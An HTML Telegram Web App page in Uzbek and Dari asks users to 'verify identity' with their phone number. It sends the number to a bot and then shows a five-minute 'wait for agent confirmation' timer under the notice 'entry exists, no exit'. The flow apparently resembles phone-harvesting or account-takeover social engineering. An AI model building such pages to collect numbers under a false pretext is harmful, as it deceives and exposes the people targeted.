<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web App Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bg-color: #0f0f12;
            --card-bg: #1a1a24;
            --accent-color: #d9b54a;
            --text-color: #ffffff;
            --text-secondary: #a0a0b0;
            --danger-color: #e53935;
        }

        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            box-sizing: border-box;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 24px;
            box-sizing: border-box;
        }

        .card {
            background: var(--card-bg);
            border-radius: 16px;
            padding: 24px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
            border: 1px solid rgba(217, 181, 74, 0.2);
            text-align: center;
        }

        .title {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 8px;
            letter-spacing: 0.5px;
        }

        .subtitle {
            font-size: 13px;
            color: var(--text-secondary);
            margin-bottom: 24px;
            line-height: 1.4;
        }

        .lang-selector {
            display: flex;
            gap: 12px;
            margin-bottom: 24px;
        }

        .lang-btn {
            flex: 1;
            padding: 12px;
            background: #252538;
            border: 1px solid #33334d;
            border-radius: 8px;
            color: var(--text-color);
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }

        .lang-btn.active {
            background: var(--accent-color);
            color: #000;
            border-color: var(--accent-color);
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 12px;
            color: var(--text-secondary);
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }

        input[type="tel"] {
            width: 100%;
            padding: 14px;
            background: #0f0f12;
            border: 1px solid #33334d;
            border-radius: 8px;
            color: var(--text-color);
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
        }

        input[type="tel"]:focus {
            border-color: var(--accent-color);
        }

        .notice {
            font-size: 11px;
            color: var(--danger-color);
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            font-weight: 600;
        }

        .btn-submit {
            width: 100%;
            padding: 14px;
            background: var(--accent-color);
            color: #000;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        .btn-submit:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .timer-screen {
            display: none;
        }

        .timer-display {
            font-size: 32px;
            font-weight: 800;
            color: var(--accent-color);
            margin: 20px 0;
            font-family: monospace;
        }

        .status-text {
            font-size: 14px;
            color: var(--text-secondary);
            margin-bottom: 12px;
        }
    </style>
</head>
<body>

<div class="container">
    <!-- Step 1: Language Selection & Input -->
    <div class="card" id="step-input">
        <div class="lang-selector">
            <button class="lang-btn active" id="btn-uz" onclick="setLanguage('uz')">Oʻzbekcha</button>
            <button class="lang-btn" id="btn-af" onclick="setLanguage('af')">دری (Dari)</button>
        </div>

        <div class="title" id="txt-title">Telefon raqamni tasdiqlash</div>
        <div class="subtitle" id="txt-subtitle">Ilovadan foydalanish uchun shaxsingizni tasdiqlashingiz kerak.</div>

        <div class="form-group">
            <label id="txt-label">Telefon raqamingiz</label>
            <input type="tel" id="phone-input" placeholder="+998 90 123 45 67">
        </div>

        <div class="notice" id="txt-notice">Kirish bor chiqish yoʻq</div>

        <button class="btn-submit" id="txt-btn" onclick="submitData()">Tasdiqlash</button>
    </div>

    <!-- Step 2: Timer Screen -->
    <div class="card timer-screen" id="step-timer">
        <div class="title" id="timer-title">Agent tasdiqlashini kuting</div>
        <div class="timer-display" id="timer-count">05:00</div>
        <div class="status-text" id="timer-status">Maʼlumotlar koʻrib chiqilmoqda...</div>
        <div class="notice" id="timer-notice">Kirish bor chiqish yoʻq</div>
    </div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    let currentLang = 'uz';

    const translations = {
        uz: {
            title: "Telefon raqamni tasdiqlash",
            subtitle: "Ilovadan foydalanish uchun shaxsingizni tasdiqlashingiz kerak.",
            label: "Telefon raqamingiz",
            notice: "Kirish bor chiqish yoʻq",
            btn: "Tasdiqlash",
            timerTitle: "Agent tasdiqlashini kuting",
            timerStatus: "Maʼlumotlar koʻrib chiqilmoqda..."
        },
        af: {
            title: "تایید شماره تلیفون",
            subtitle: "برای استفاده از اپلیکیشن باید هویت خود را تایید کنید.",
            label: "شماره تلیفون شما",
            notice: "ورود هست برگشت نیست",
            btn: "تایید",
            timerTitle: "منتظر تایید ایجنټ باشید",
            timerStatus: "اطلاعات در حال بررسی است..."
        }
    };

    function setLanguage(lang) {
        currentLang = lang;
        document.getElementById('btn-uz').classList.toggle('active', lang === 'uz');
        document.getElementById('btn-af').classList.toggle('active', lang === 'af');

        const t = translations[lang];
        document.getElementById('txt-title').innerText = t.title;
        document.getElementById('txt-subtitle').innerText = t.subtitle;
        document.getElementById('txt-label').innerText = t.label;
        document.getElementById('txt-notice').innerText = t.notice;
        document.getElementById('txt-btn').innerText = t.btn;
        document.getElementById('timer-title').innerText = t.timerTitle;
        document.getElementById('timer-status').innerText = t.timerStatus;
        document.getElementById('timer-notice').innerText = t.notice;
    }

    function startTimer(seconds) {
        let duration = seconds;
        const display = document.getElementById('timer-count');
        
        const interval = setInterval(() => {
            const minutes = Math.floor(duration / 60);
            const secs = duration % 60;

            display.textContent = 
                (minutes < 10 ? "0" : "") + minutes + ":" + 
                (secs < 10 ? "0" : "") + secs;

            if (--duration < 0) {
                clearInterval(interval);
                display.textContent = "00:00";
            }
        }, 1000);
    }

    function submitData() {
        const phone = document.getElementById('phone-input').value;
        if (!phone || phone.length < 7) {
            alert(currentLang === 'uz' ? "Raqamni toʻgʻri kiriting" : "شماره را درست وارد کنید");
            return;
        }

        // WebApp ma'lumotlarini botga yuborish
        const payload = {
            phone: phone,
            lang: currentLang
        };

        tg.sendData(JSON.stringify(payload));

        // UI holatini taymerga o'tkazish
        document.getElementById('step-input').style.display = 'none';
        document.getElementById('step-timer').style.display = 'block';
        
        startTimer(300); // 5 daqiqalik taymer
    }

    // Sahifa qayta yuklanganda taymer holatini tekshirish (agar saqlangan bo'lsa)
    window.onload = function() {
        setLanguage('uz');
    };
</script>
</body>
</html>
